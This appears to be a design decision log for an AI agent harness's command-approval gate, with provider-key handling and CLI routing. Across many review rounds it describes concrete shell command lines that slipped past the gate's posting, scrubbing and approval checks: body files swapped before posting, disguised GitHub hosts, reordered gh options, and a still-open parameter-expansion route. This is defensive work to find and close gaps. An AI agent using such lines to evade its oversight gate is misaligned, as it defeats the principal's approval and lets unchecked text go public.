  seat key over request id, decision, binding hash and seat name (`exo.core.approvals`); the key comes from the
  verified bus registry, else `<keys dir>/<seat>.pub`. Unsigned seat answers are refused. A principal answer is
  not signed: it is as strong as the socket's permissions. A real setup where a lead seat approves public posts is expressible as
  `github_post: ["role:public-reviewer"]` with `roles: {public-reviewer: ["seat:<lead>"]}`; it is not configured
  live.
- **Grants:** "always" becomes a grant with a scope (category plus exact target; outward also the text hash), an
  expiry (30 days, outward 7) and a ledger row, kept in the principal store (`state/approval-grants.json`, 0600),
  else in exod's home. Only the principal can create one: a seat may approve one exact text with `allow`, and
  its `allow_always` is refused. `/grants` lists live grants and `/grants revoke <id>` removes one with a ledger
  row; it is a plugin command reached through `command.run`, so no protocol command. The store, not exod state, because a grant is the principal's consent and belongs with
  their policies and ledger, and it then holds for every seat of that principal. The gate checks grants itself
  and tells the core (`persist`) not to keep its own unscoped in-memory allow. Credentials never get a grant.
- **Scrub:** posts to public targets are swept for seat names (seat files, bus registry, store agents), home
  paths, model ids from the catalog and internal ids, plus the user's own list. A hit holds the post with each
  violation listed. Plain-word names match only as whole tokens; distinctive names (hyphen, underscore or digit)
  also match inside words and with any separator. The footer stays empty in code; the oversight line is an
  example in the template. `footer_exposures` can limit the footer to public targets.
- **Protocol:** no new command or event. Optional fields: `ApprovalRequested.approvers`, `.binding`;
  `ApprovalRespond.binding`, `.sig`.
- **Rejected:** an unscoped "always" for outward acts (one approval would cover any later text); keeping grants
  in the core's memory (lost on restart, no expiry, no audit); a hard-coded footer (that is one principal's
  branding); substring matching for every name (a seat called "canary" would hold every post that says canary
  release).
- **Rulings (coordinator, 2026-10-12):** seats sign their answers; the principal can always answer; standing
  grants are the principal's alone; list and revoke as a `command.run` command.
- **Not done:** escalation along an org graph (P1-2); the TUI and web clients do not yet show `approvers`, echo
  `binding`, or sign as a seat (left for the UI work); no client helper beyond `sign_approval` for a seat to answer.
- **Amendment 2026-10-19 (issue #208):** the posting step, the scrub and the binding saw only text on the line, and
  a body from stdin, `@file`, `--input`, command output or a variable passed as empty. Such a post was allowed
  under an internal scope, and an "always" bound to the line covered any later body. Now `_classify_gh` and
  `_classify_http` mark it `unseen_body` (stdin not spelled out on the line, `@` fields, `--input`, `--fill`,
  templates, the editor, generated notes, gist files, curl/wget/httpie file and stdin bodies, any expanded word
  except a header or login value), and text options are read as gh reads them (the last of a repeated option, short
  clusters). `gate.body_unseen` also counts a body file nobody read. Under the posting rules such a post asks with
  a violation that names the cause; in every category it gets `once` (no "always") and no grant matches it; a
  required executor refuses it as a recorded `deny`. The exo-gate hook reads a body file only by an absolute path:
  it does not know the command's folder (`cd docs && gh ... --body-file notes.md`). An unrelated heredoc on the
  line no longer fills in a body file's text, and curl's `-d@f` and gh api's `-fbody=x` are posts. Stdin is read only
  where bash and the writer change nothing: a literal heredoc (no `$`, backtick or backslash unless the delimiter is
  quoted), a plain here-string, or a pipe from one simple command (`cat` with such a heredoc, `echo` with no option or
  backslash, `printf` with one plain format); a subshell or group before the pipe, `printf` formats and `echo -e` are
  unseen. gh text options are read with gh's own table of options that take a value (`-t -b -b x`), `--attach` is
  unseen, and curl's `--data-ascii`, `-K` and a host it cannot read (`-d x "$URL"`) are posts, not reads or local
  writes. After a second review: a word bash may expand without `$` (brace expansion, a glob, a leading `~`) counts
  as an expansion; only a heredoc or here-string on descriptor 0 is stdin (heredocs keep their fd number, on the
  `_Word.fd` lexer change #305 also makes); a heredoc ended by a near match of its delimiter (`EOF `, ` EOF`, CR, a
  tab under plain `<<`) is `ambiguous`, so its body is unseen; the long text options take a value in the gh table;
  and the hook never reads a body file under `/dev` or `/proc`. Rejected:
  resolving a relative path against the tool's `cwd` (the hook receives no cwd, and a `cd` on the line moves it);
  reading the stdin source file in the gate (the same folder problem, and a host read before a required worker).
  Limits: `docs/GATE.md` "What an approval covers".
- **Amendment 2026-10-21 (issue #399):** the scope, the scrub, the footer and the third-party check all follow a gh
  post's target, and the target was the first word after the subcommand that began with a GitHub URL, option values
  included. `gh pr comment 5 -R pub/repo -b 'https://github.com/myorg/app/pull/9 ...'` was a post on `myorg/app#9`, so
  under `internal: [myorg/*]` it logged and the scrub never ran. A number in an option value (`-b 7`, `--milestone 3`)
  became the target's number the same way. Now `_gh_target` takes the repo and the number from `-R` and the operands
  only. It reads them with the table the unseen check uses (`_GH_TAKES` and the text options, through
  `_option_values`), so `--opt=value`, short clusters, `--` and options with no value read as in gh. `gh issue close`
  lists `--duplicate-of` and `-r` now, and the table has rows for pr ready, lock and unlock, issue develop, lock,
  unlock, delete and transfer, and release upload and delete (gh 2.89 `--help`), beside the pr reopen, pr merge and
  issue reopen rows from #397, which `_GH_TAKES_BEFORE_399` leaves out since they are main's rows. gh keeps the
  last `-R`. A URL operand names the repo even beside `-R`, because gh does that (`pr/shared/finder.go` and
  `issue/shared/lookup.go` in gh 2.89). `_gh_url` reads the scheme and the host in any case, without a user, a port
  or a leading `www.`, and the path decoded, close to what Go's url.Parse and `ghrepo.NewWithHost` give gh, and
  takes github.com and any host that ends in `.github.com` (2026-10-22, below). gh's
  readers take a pull request URL (`ParseURL`) or an issue or pull request URL (the issue lookup). `_gh_url` takes a
  discussion URL and a repo URL too, which only adds a reading, since `-R` stays an other target. `gh repo` drops a
  repo URL's `.git`. The reading before #399 keeps `_GH_URL` as it was, so the URL as written still counts. The
  other readings the gate cannot rule out are kept as `Classification.alt_targets`, each with a copy of the action as
  a part: `-R` when a URL operand names another repo,
  and the reading before #399. `decide` decides the line on each and keeps the strictest outcome, the widest exposure,
  any third party, and every violation and reserved part. So a line never decides lower than it did, and a deny or
  reserved entry on either repo still fires, also when the gh call is not the line's most severe part. Each copy is
  marked (`Classification.alt_copy`), and an ssh or mosh hop gives an empty one the host, as it gives the action's
  own empty target. So a rule on the host's category sees it, as on main, where the gh part's own target was the
  host. Matching the copies by their fields instead could retarget another part of the line. The exo-gate hook gives
  the text it reads from a post's body file to each copy as well (`gate.fill_body`), and it reads the floor's body
  file the same way, so a clean body counts as seen in every reading, as it did on main. A line with
  other targets binds its approval to the exact command, as an outward act does (`binds_exact`), so a standing grant
  on one of its targets does not run it, and its rule key and an "always" on it cover that exact line only. The
  question the principal sees names every other target ("It may land on pub/repo#7 instead."), since the target it
  names first may not be the one gh acts on. For a gh command outside the table the gate reads the operands twice,
  with every option a flag and with every option taking a value. A URL operand that only the first reading finds never
  replaces `-R`, and with no `-R` it names the target beside the reading without it. The unseen check also reads a
  post with each row as it was before #399 (`_GH_TAKES_BEFORE_399`), and a line unseen then stays unseen, a close
  whose `--duplicate-of` value is an option word too (gh refuses that line). gh also finds a subcommand past the
  options before it, and the subcommand reads every option on the line: `gh pr -R pub/repo comment 5` and
  `gh pr -b text comment 5` post (gh 2.89). The gate took the third word for the subcommand, so such a line was a read
  and ran under any policy. `_gh_verb_order` now finds the subcommand as cobra does, past an empty word too, before
  the command as well, and a word from an expansion where it or an option may stand makes the line `opaque_exec`,
  unless the line as written, past the empty words before the command, is credentials (`gh "" secret "$V"`). An
  alias from gh 2.89's help (`_GH_ALIASES`: `new`, `ls`, `co`, `remove`) reads as the subcommand it names, and gets
  the floor below too. The line as read before is decided too (`Classification.floor`), the stricter standing on each
  axis. `body_unseen` counts it too, so a line unseen as read before stays unseen. The exo-gate hook reads it in its
  own checks too: a required executor refuses the line when either reading has a body file or an unseen body, so
  `gh pr "$V" 5 -F notes.md` is refused as on main. Only an approver both
  readings' categories allow may answer, and the line is answered once, with no grant and an ask in observe mode,
  when either reading is in `NO_GRANT` or has an unseen body. A seat that answers `github_post` does not answer
  `gh pr -b x comment 5`, which the principal alone answered as a read. Without the floor a
  compound line could decide lower: in `git push origin f && gh issue -R myorg/app edit 5` the edit now outranks the
  push, as in the same line with the options after the subcommand, and a private scope lowers it. A differential
  against main with #397 (b419f91b) read 270,394 distinct gh lines, every corpus of the #399 rounds and reviews, in
  both trees. The 183,611 that classify differently were decided under 119 policies, the earlier harnesses' and
  the reviews' (a deny map, a rule and a reserved entry on an ssh host with a gh category among them), and none was
  lower on the outcome, the exposure, the third party, the violations, the reserved parts, `is_outward` or
  `binds_exact`. They also ran through the exo-gate hook in 13 setups of 5 policies, with standing grants on 31
  targets, with none, in observe mode and with a required executor, and none was lower on what the hook does (run,
  ask or block), who may answer (each category with its own seat), "once", the binding or the scope an "always"
  keeps. The unseen check and the executor's body check read both readings there, as the hook does, and none is
  lower. 91 lines lose the `secret store` or `unseen_body` signal on the line as read, and the line as read before
  keeps it, so the decision stands. For `secret store`, gh now reads a credentials subcommand past an option
  (`gh ssh-key -y 123 delete`), so that line is credentials already and gets no extra mark, as
  `cat .env && gh ssh-key delete 123 -y` gets none on main. The other 86,783 lines classify the same in both trees,
  so they decide the same, and 5,000 of them run both ways differed on no axis. The gate does not read `GH_HOST` or
  `gh api --hostname`, so `owner/name` counts as a repo on github.com. Nor does it read `GH_REPO`, which gh takes for
  `-R` when the line has none: such a line counts as one on the current repo. `gh api` read its
  endpoint from the first word with a `/` and no `=`, an option's value included (a header, a jq query). It now reads
  its one operand with gh api's options that take a value (`_gh_api_endpoint`), and the old word is an other target.
  Its method reads as pflag reads `-X` and `--method` (`_gh_api_method`): a cluster ends at `X`, one `=` goes, and the
  last stands, so `gh api -iX DELETE` is a delete, which the first `-X` word as written read as a GET. When the two
  differ the line gets a floor, read with the first word as before, so `-X DELETE -X GET` still meets a deny on
  deletes.
  `-R` reads as pflag and gh read it: one `=` after a short option goes (`-R=x`, `-wR=x`), and `_gh_repo` reads
  `[HOST/]owner/name` and a repo URL as `ghrepo.FromFullName` does, the URL's path decoded as Go's url.Parse
  decodes it. On a host gh does not send to github.com the value as
  written is an other target, since a scope names repos on github.com. An operand from an expansion adds the empty
  target, a repo the line does not name, since `-R` does not rule out the repo of a URL in it. Rejected: letting `-R`
  win over a URL operand, since gh posts on the URL's repo and lines that asked as public would log. Also rejected:
  dropping the earlier reading, since a deny or a rule naming the repo a body links to would stop firing on a line it
  caught before.
  2026-10-22, round 6 of the review: gh sends its request for a repo on any host that ends in `.github.com` to
  github.com, with the github.com token. go-gh 2.13's `auth.NormalizeHostname` reads such a host as github.com, and
  its GraphQL and REST clients (`graphQLEndpoint`, `restPrefix`) call github.com's API for it. gh's own
  `ghinstance.RESTPrefix` does not read the host that way, and `gh repo delete` builds its URL with it, so
  `gh repo delete https://api.github.com/pub/repo` asks `api.api.github.com`, which no DNS name answers. Reading
  such a host as github.com is the stricter reading either way. The one exception is garage.github.com, which both
  clients call at itself. `_gh_url` took only github.com and `www.github.com`, so
  `gh pr comment https://api.github.com/pub/repo/pull/9 -R myorg/app` read as a post on myorg/app and logged under
  `internal: [myorg/*]`, with no scrub and no third-party check. `_gh_on_github` now decides the host for `_gh_url`
  and for `_gh_repo`'s sure, after the case, a user, a port and a leading `www.` go as gh drops them, so a `gh repo`
  operand such as `api.github.com/pub/x` names pub/x. A host gh treats as another instance (`ghe.corp`, a ghe.com
  tenancy, `github.com.`, a look-alike) names that instance's repo: a URL operand there, or `gh repo`'s first word, is
  an other target (`_gh_elsewhere`), as a `-R` on another instance is. The gate read such a URL as no repo before. gh
  also finds the command past the options before it (cobra's `stripFlags` with gh's root flags, where `--help` and
  `--version` stand alone). `-R` is a persistent flag of each group that calls `cmdutil.EnableRepoOverride`: pr,
  issue, release, secret, variable and others. gh repo itself does not, only `gh repo rename` and its deploy-key and
  autolink groups. So
  `gh -R pub/repo pr comment 5` posts on pub/repo#5. The gate read `-R` there as an alias or extension, so under
  `opaque_exec: allow` the post ran with no posting checks. `_gh_command_at` finds the command as cobra does, and the
  line as read before stays the floor. An option's value before the subcommand that bash may split (`_gh_splits`: an
  expansion outside quotes, a glob, a brace expansion, `"$@"`) may put a word where gh looks for the subcommand, so
  the line counts as `opaque_exec`, as with a word from an expansion in the subcommand's place (`gh pr -R $R view 5`).
  A quoted value is one word. The reading before #399 and the floor keep what main read.
  A differential against main 2ef1a81f found no line lower. gate_diff read 69,792 actions (its built-in
  corpus and round 3's 40,000 lines) under its 76 policies, and 66,310 targeted lines (the review's lines, each host
  form, options before the command and expansions before the subcommand, each also behind ssh, sudo, `bash -c` and
  xargs and in compound lines) under those and 8 of the review's policies. The decide harness read the targeted lines
  and 20,000 lines sampled from the round 5 corpus under 124 policies, and the exo-gate hook harness in 13 setups.
  On 5,500 of them the line as read drops a signal (`indirection` mostly) or a body the executor checks, and the line
  as read before keeps it, so the decision and the hook stand.
  2026-10-22, round 7 of the review: Go's url.Parse checks only that a port is digits, with no range check
  (`validOptionalPort` in Go 1.26), and `u.Hostname()` drops it. Python refuses a port past 65535, so `_gh_url` read
  `https://github.com:99999/pub/x/pull/9` as no URL, and `gh pr review` with it and `-R myorg/app` was a post on
  myorg/app that an allow rule there let through, while gh approves pub/x#9. url.Parse also decodes the host, and
  Go's strings.ToLower maps U+0130 to `i`, where Python gives `i` and a combining dot, so for gh
  `https://g%C4%B0thub.com/pub/repo/pull/9` is on github.com. `_gh_url_host` now reads the host as Go 1.26 does:
  after the last `@`, the port after the first `:` (or after the `]` of an IPv6 address) as digits only, the host
  decoded, and None where url.Parse refuses the URL (a second colon, a `[` past the start, an escape below %80 other
  than %25, a control character before its `#`). `_gh_host` lowers each character, U+0130 to `i`. It is the only
  character whose lower case differs between Go 1.26 and Python 3.13. `_gh_repo` reads a URL `-R` the same way, its
  query and fragment dropped. `_gh_elsewhere` took any URL with two path segments, in any operand, also an option's
  value in the reading where every option is a flag, so `gh variable set X -R myorg/app --body
  https://hooks.example.com/a/b` logged under `private: [myorg/*]`. It now reads a repo only where gh does: a pull
  request URL in gh pr (finder.go's `ParseURL`), an issue or pull request URL in gh issue (lookup.go), a discussion
  URL in the gate's discussion group, and the first word of gh repo and of gh label clone (`ghrepo.FromFullName`).
  `_gh_splits` scanned the source of a double-quoted word itself and counted parentheses in a `$( )` without its
  quotes, so `gh pr -R "$(: ")")"$R view 5` read as a view. The lexer now marks a word bash may split
  (`_Word.split`): an expansion outside double quotes, `"$@"`, `"${name[@]}"`, a `$( )` past the nesting cap, and a
  `${ }` with a quote, a backslash or a `$(` before its first `}`, since bash may read past that `}`. An unquoted
  `$(cat <<'EOF' .. EOF)` is such a word too, so gh reads it as a word from an expansion. Last, `gh -R $R secret set X`
  stayed `opaque_exec`, since the split value took the command's place. When it does, the line is also read with
  the value as one word, and that reading stands when it gives no grant (`credentials`).
  A differential against main 2ef1a81f found no line lower. gate_diff read 14,426 targeted lines (each port, host
  and escape form, URLs in option values, quotes in a `$( )`, here-doc substitutions, split values before the
  command, each also behind wrappers and in compound lines) and round 6's 23,263 lines under 106 policies, and its
  built-in corpus of 30,515 actions under its 76 policies. The decide harness read 3,796 of the lines that classify
  differently under 119 policies, and the exo-gate hook harness 1,400 of them in 13 setups. On 208 the line as read
  drops the `indirection` signal and the line as read before keeps it, so the decision and the hook stand.
  2026-10-22, round 8 of the review: gh reads `-R` and `gh repo`'s first word with `ghrepo.FromFullName`. For a URL,
  go-gh's `RepoInfoFromURL` drops a leading `www.` and lowers the host, and `ghrepo.NewWithHost` does both again. The
  gate gave such a host one strip, so `gh repo delete https://WWW.garage.github.com/pub/x` read as pub/x on
  github.com, while gh deletes the repo on garage.github.com. `_gh_repo_parts` now gives a URL's host `_gh_host`
  twice, and `_gh_url` does the same for gh repo's first word. That line now has the empty target and the other target
  `garage.github.com/pub/x`, as `https://garage.github.com/pub/x` has. A pull request URL keeps one strip, as
  finder.go's `ParseURL` gives it. gh gist takes a gist's URL or id (`GistIDFromURL`), never a repo. Round 6 read
  `https://gist.github.com/pub/abc` as the repo pub/abc, since its host ends in `.github.com`, so `_gh_read` no longer
  reads a URL in gh gist. The reading before #399 keeps a github.com URL there, as main read it. The docs now say
  which groups take `-R`: those that call `cmdutil.EnableRepoOverride`, such as pr, issue, release, secret and
  variable, and not gh repo itself. GATE.md's limits name `GH_COBRA`, under which gh's root has no `--version` flag,
  and `GODEBUG=urlstrictcolons=0`. A differential against main 2ef1a81f found no line lower. gate_diff read 34,440
  targeted lines (each `www.` form of a repo word, `-R` and a pull request URL, gist URLs and ids, `--version`
  before the command with and without `GH_COBRA`, each also behind ssh and `bash -c` and in compound lines) under
  106 policies. The 3,822 of them that classify differently from round 7 went through the decide harness under 119
  policies and the exo-gate hook harness in 13 setups, and none is lower on any axis.
  2026-10-22, round 9 of the review: Go's url.Parse cuts the fragment off before it looks for a control character,
  and keeps a fragment that has one (Go 1.26's `Parse` and `setFragment`). `_gh_url_parts` and `_gh_repo_parts`
  refused a URL with a control character anywhere in it, so with `-R myorg/app` the line
  `gh pr review $'https://api.github.com/pub/x/pull/9#\t' --approve` was a post on myorg/app that an allow rule there
  let through, while gh approves pub/x#9. They now look for one only before the first `#`. Round 8 said gh reads gh
  repo's first word with `ghrepo.FromFullName`. gh repo fork reads an `http:/`, `https:/` or `git@` value, and gh
  repo clone any value with a `:`, with cli's `git.ParseURL` and `ghrepo.FromURL` instead, which drops a leading
  `www.` once (fork.go and clone.go in gh 2.89). So `gh repo fork https://www.www.garage.github.com/pub/x` forks
  pub/x on github.com, and round 8 read it as garage.github.com, where a deny on pub/* did not fire. `_gh_from_url`
  tells the two apart, and `_gh_repo_parts` then reads the value as gh does: one strip, any value with a `:` and no
  URL scheme as an scp-like ssh remote, and for clone the path's first two parts. Last, an option word before gh's
  command with its `=` before any expansion (`gh --repo="$R" secret set X`) stands alone in cobra's `stripFlags`,
  whatever bash puts after the `=`. `_gh_command_at` took it for the command, so the line was `opaque_exec`, and a
  deny on credentials did not fire. It now passes over such a word unless bash may split it. When bash may, the line
  read with the word whole stands when it gives no grant, as for `gh -R $R secret set X`. A differential against main
  2ef1a81f found no line lower. gate_diff read 32,778 targeted lines (control characters around a URL's fragment,
  each fork and clone value form, option words with a `=` before the command, each also behind ssh and `bash -c`),
  round 7's 14,426 lines and round 8's 34,440 lines under 106 policies, and its built-in corpus of 31,505 actions
  under its 76 policies. The 12,041 of those lines that classify differently from round 8 went through the decide
  harness under 119 policies and the exo-gate hook harness in 13 setups, and none is lower on a decision axis or in
  the hook. On 954 the line as read drops the `indirection` signal and the line as read before keeps it, so the
  decision and the hook stand.
  2026-10-22, round 10 of the review: since #406 the posting checks run on every post, and each copy of a post on
  another target repeated the post's violations under the copy's name. A post with many violations then pushed
  another post's past the twenty listed, where main lists it (`gh pr comment 5 -R https://ghe.corp/pub/repo -b
  '<nine names>' && gh pr comment 7 -R pub/other -b 'ZZOTHER F'`). gate_diff counted 12 lowered pairs on 4 such
  lines. A copy now lists, right after its post, only what neither the post nor another copy of it lists. A copy
  can still find what its post does not: under a scope its target may be public where the post's is internal, and
  main may have read the post on that target. A post read on another target than main's can also list more than
  main does. So a line with such copies lists every violation, with no cap, and its list holds what main lists
  (round 11 bounds it).
  When decide merges the line's readings, a text two posts of one name both meet stays listed as often as one
  reading lists it, as main lists it, where the merge kept it once. The ledger view (`Classification.as_dict`)
  hides a user and password in `alt_targets` too. gate_diff, main 39cafcba against this change: the built-in
  corpus, 62,293 actions under 87 policies, 0 lowered. 1,024 lines of crowded, repeated-name and scoped posts
  under 93 policies: 0 lowered with the #460 script. Main's script at 3ddd89e9 counts 80 pairs on 16 of those
  lines, and on each the one text missing is main's `and N more on other posts`, which a line that lists every
  violation has no need of. #460 stops counting that line.
  2026-10-23, round 11 of the review: one copy lifted the cap for every post on the line, so the card, the ledger
  row and the decision model's input grew with the line. One copy and 500 posts of 20 names each gave a 1.1 MB
  reason, past the ledger authority's 1 MiB limit, so no row was written. Now the other posts' entries keep main's
  room of twenty, less the line's own violations, and the entries of posts with copies and of the copies have a room
  of their own, 200 per reading (`_LISTED_WITH_COPIES`). Each keeps the line's order. Main lists an entry of a post
  without copies only within its room, and lists at most twenty of the others, so this lists every entry main lists
  while the posts with copies and their copies list no more than 200. A line past that can list fewer than main
  does, and still asks. A first version had one room for both, so ten posts with copies of twenty names each pushed
  a plain post's violation out (found by an independent review of this round). When decide merges the line's
  readings, it lists one `and N more on other posts`, last, which counts what the readings left out (round 13). The
  bound is on the count. 200 entries with long
  targets can still pass 1 MiB where main's twenty do not, and main bounds no row either: #485. The docstring of
  `classify` ends on its old last line again, which main's gate_diff tests patch after.
  2026-10-23, round 13 of the review: that count could fall short or drop out. A copy's finding is in the merged
  list twice, under the copy's name and as the post's own on the copy's target, and the old count took each such
  twin for an entry a reading left out. So `gh pr comment 5 -R https://ghe.example.com/myorg/repo -b '<5 names> F'`
  before 25 plain posts listed 30 entries and no count, where main lists 20 and `and 10 more`, and 5 posts were
  neither listed nor counted. Each decision now keeps the entries it left out (`Decision.hidden`, out of the ledger
  view). The merge counts each one the merged list does not hold, as often as one reading holds it. The merged list
  and its count then hold what the merge lists with no room at all, so that line lists 30 and `and 5 more`.
  Limits: `docs/GATE.md` "Where a gh command lands".

- **Amendment (2026-10-21, #397):** a merge commit's subject and body are posted text.
  `gh pr merge --subject`/`--body` become the commit message in the repository, public on a public
  repository, so the posting rules and the scrub see them when a merge carries them, as they have
  seen a close's comment since #326. A merge carrying neither is unchanged. A reopen's comment is
  posted text the same way: gh posts it on the thread.
- **Amendment 2026-10-24 (issue #343):** the exo-gate hook read a post's absolute body file before the line ran
  and checked that text, but another part of the line could change the file before gh read it. So
  `cp /w/notes.md /w/clean.md && gh pr comment 5 -R myorg/app --body-file /w/clean.md` ran under `forbid_words` with
  the forbidden word in the text gh posted. A writer later in a pipe or in the background, a redirection onto the
  file, and an ssh hop (where the path names a file on the other host) did the same. Now the hook reads the file
  only on a line where the gate finds no other part, in either reading (#399): no other command, redirection to a
  file, assignment that changes what runs (`GH_EDITOR=x`, `LD_PRELOAD=..`) or stands on its own (`X=1; gh ..`),
  wrapper it does not see through, shell, ssh hop, `{ }` group, or code around the call in `execute_code` or
  `python -c`. A variable that changes nothing that runs (`NO_COLOR=1 gh ..`) adds no part. A copy of the post on
  another target is the post itself, not another part. On any other line the file stays unread, so the post is
  unseen: it asks once and no grant matches it, as a stdin body does. The hook passes the files it left unread for
  this reason to `decide` (`held_body_files`): every post's absolute, readable file on the line, a second post's
  too, since alone on its line each would be read. Their post's note then says the file was not read and why
  (`UNSEEN_ON_LINE`), in place of the hint to pass an absolute path, which the post already did. A post also unseen
  another way (a title from a variable, a repeated option) keeps the plain note beside it, since alone on its line
  it would still be unseen. The note says so because the card no longer shows what the file holds: on a line of
  two posts it no longer names a forbidden word in the first post's file, which main read. Rejected: skipping the
  read only when a known writer is on the line. Listing every writer (`cp`, `mv`, `tee`, `dd`, `sed -i`, a
  redirection, an interpreter, a remote host) is error-prone, a missed one posts text nobody checked, and the
  asking path already exists. Also rejected: reading the file anyway to list its violations on the card, since they
  describe a text gh may not post. Limits: the hook reads the file before the command runs, so a process an earlier
  tool call started can still change it between the read and gh. Closing that would need the post to run on a
  snapshot of the text the hook read. The gate reads `sudo --chroot=DIR gh ..` as `sudo gh ..`, so there the hook
  reads the file by its path while gh reads the one under DIR, as on main. The decision rules are unchanged, since
  no call main's `scripts/gate_diff.py` runs sets `held_body_files`. Run on d79639f1 against this head, it finds
  nothing lowered or changed in 5,586,792 pairs on its own corpus, in 431,433 on a #343 corpus of 432 calls, and in
  199,491 on a second one of 344. Through the hook, the first corpus's 426 lines lower nothing under 2 policies:
  446 of the 852 pairs ask once where main ran or offered "always". Limits: `docs/GATE.md` "What an approval
  covers".
  *With main's newer readings (2026-10-25).* Main reads a call more ways now. `gate.readings` lists the call, the
  call as read before #311 (`also`), its `floor` and the floor's `also` (#452). A store read from the tool's own
  folder is a part (#311). A sudo write that takes the lead from a read keeps that read as `displaced`, and both are
  parts (#454). An ssh fed a line the gate can read runs that line on the host (#316). The hook walks every reading:
  it reads a body file only when no part of any reading is anything but a copy of the post, and on any other line
  it names every post's file in `held_body_files`. So the file stays unread and the post asks once in
  `cp config /w/clean.md && gh pr comment 5 -R myorg/app --body-file /w/clean.md` with `~/.kube` as the tool's
  folder, in `echo $(sudo cat /w/notes.md > /w/clean.md) && gh ...` and in
  `echo 'gh ... --body-file /w/clean.md' | ssh prod-db`. Main read the file in each, and ran the second.
  `gate_diff` sets `held_body_files` only through a `CONTEXTS` entry. With the key set, it reports the swap of
  `UNSEEN_BODY` for `UNSEEN_ON_LINE` as violations lost, and nothing else: outcome 0, reserved 0. Run from main
  edeb4f89 against this head without the key, it finds nothing lowered or changed in 6,241,206 pairs on its own
  corpus, and in 508,326 on a #343 corpus of 952 calls across the readings above. With the key, that corpus loses
  violations in 15,880 pairs, each the swap, and lowers no outcome or reserved entry. Through the hook, its 952
  calls lower nothing under 2 policies, widen no approvers and read no file main left unread. The chroot limit
  above holds for `sudo -RDIR gh ..` too, and #544 tracks both forms. Another limit, also on main: the gate does
  not see a command inside a parameter word (#143). So `NO_COLOR=${X:-$(cp /w/notes.md /w/clean.md)} gh ...` reads
  the file and runs. The open PR #158 would fix that.
  *A NUL in a body-file path (2026-10-26, review of PR #545).* `os.path.realpath` and `lstat` raise `ValueError` on an
  embedded NUL, and `_body_path` caught only `OSError`. A post whose `--body-file` path held a NUL sent the hook into
  its error card, which drops "once", so the core offered "always" and stored `plugin_rule:exo-gate:error:terminal`. A
  lone post did this on main, and #545 reached the path for every post on a held line. `_body_path` now takes such a
  path as unreadable, so the post takes the route a missing file takes: it stays unseen, and asks once wherever
  posting rules apply to it. A policy that allows the post and exempts it from posting rules now allows it, as it
  allows the same post with a missing or readable file. Main asked there only because the hook crashed. gh never
  opens such a path, and the core's shell tool refuses a NUL in argv, so the line could not run anyway.

## D-034 (2026-10-12) Providers setup: one engine, three surfaces, keys write-only
- **Amendment 2026-10-19 (#271):** provider status rows replace URL userinfo with `***@`, including the rows
  printed by `exo models` and sent to `/providers` and the web. Invalid URLs produce a generic label without
  repeating the input. Actual connections and probes keep the configured endpoint. Paths, queries and fragments
  are not secret-scrubbed by this display helper. No command, key, setting or setup step changes.
- **Amendment 2026-10-27 (#691, fixed in #728, exo-desktop #16, PR #674):** `exo config show`, `exo config get`
  and `config.get` mask the same values, and those are the values `config.set` refuses. Before exo-desktop #16 the
  two commands printed raw values. `config.get` judged a dotted key by its last part only, so a container under
  `token` and every literal under `headers` printed in full. Now `redact` takes the whole key path, and it and the
  `config.set` refusal share one test, `_is_secret`. A string is a secret when it is shaped like a key, even beside
  a `${VAR}`, or when it is a literal (not `${VAR}`) under `env`, `headers` or a secret-shaped name at any level. So
  `{"token": {"a": "x"}}` is refused and masked, and a header literal in a file written by hand is masked. One test
  for both means the commands never print a value `config.set` would refuse. Cost: a container whose own name looks
  like a secret, such as an MCP server named `github-token`, is masked whole and cannot be set with literals.
  Rejected: judging only the last part of the key, which still printed a container under `token` and every literal
  under `headers`. No command or key changes.
- **Why:** a new user had no clean way to add a model key. Keys went in by hand (env, `security`, or a 0600
  file), `exo models` only reported, and the web client had no provider settings at all.
- **Engine:** `exo/providers_setup.py`. `rows` gives every catalog provider with status (key found and where,
  local server reachable, last live test, model count, default), never a value. `set_key` and `remove_key` write
  the Keychain on macOS, the Secret Service via `secret-tool` on Linux when present, else `keys.env` (0600, temp
  file, fsync, rename). `test_provider` makes one tiny call and returns latency and an error class. `set_default`
  does what `/default` does. Keys are write-only: only `set_key` takes one and nothing returns one. A new key is
  taught to redaction (`keys.remember_secret`) before it is stored, so even a failed store cannot leak it.
- **Surfaces:** `exo providers [add|test|remove|default]` (getpass, needs a terminal, its own parser that never
  repeats argv, so a pasted key is not echoed); the TUI `/providers` panel (client side, masked input, never the
  composer); the web Providers tab. No new protocol command: the protocol is full at 30. The core gets one
  `command.run` built-in, `providers` (status) and `providers reload <name>` (forget cached credentials), and only
  a provider name crosses the protocol.
- **Where keys are written:** in the client process (the CLI, the TUI, the web server), not in the core. The key
  then never enters a protocol message, an event, a session log or the core's memory; the core reads it from the
  store on reload like any other key.
- **Web security:** routes under `/api/providers` need a loopback peer, a loopback `Host` (DNS rebinding), a
  same-host `Origin` when sent (and `Sec-Fetch-Site` same-origin or none), and a per-launch token. `exo web`
  prints the token in the URL fragment; the page keeps it in `sessionStorage` and sends `X-Exo-Token`. Threat model
  in `docs/PROVIDERS.md`.
- **Agent:** no tool exposes this. The gate classes `exo providers add|remove|test|default`, `secret-tool`, and
  shell or code naming `/api/providers` or `providers_setup` as `credentials` (always ask, no grant).
- **Rejected:** a protocol command to set a key (the key would ride the protocol and could reach event logs);
  accepting a key as an argument (shell history, `ps`); `security add-generic-password -w VALUE` (the value is in
  argv; `security -i` reads the command from stdin instead); storing the token in `localStorage` or a cookie
  (outlives the launch, a cookie rides cross-site requests); returning a masked key or its last four characters
  (nothing about the value comes back).
- **Not done:** a remote core (`--url` on another machine) still needs keys on that machine; the TUI and web store
  on the machine they run on. Rotating several keys per provider (`key_env` lists) writes the first name only.

## D-035 (2026-10-12) Typing `exo` opens Exo: bare command, installer on PATH, `exo update`
- **Why:** the principal wants a live Exo to start the way `hermes` does: type the name. Before, `exo` with no
  arguments was an argparse error, the client was `exo tui`, and the installer left `exo` inside a venv.
- **Routing:** `main` sends no arguments, or a first argument that starts with `-` and is not `-h`, `--help` or
  `--version`, to the terminal client with every argument passed through (`exo --resume`, `exo --seat X`,
  `exo --no-intro`). `exo resume` is a real subcommand for `exo --resume`, extra flags passing through. Everything else is the old subcommand parser, so `exo models` and the rest are unchanged and
  `exo -h` lists both. No flag lives on the top-level parser, so nothing can clash with the client's flags.
  `exo --version` prints the package version, plus the git sha when Exo runs from, or was installed from, a checkout.
- **First run:** the client already noted a missing provider (D-034) and sent `/intro` (D-030). Those two now
  compose. With no working provider the providers panel opens and the intro waits, because the orientation is an
  agent turn and fails without a model. Closing the panel with a provider ready sends the one intro. With a
  provider ready, behaviour is as before.
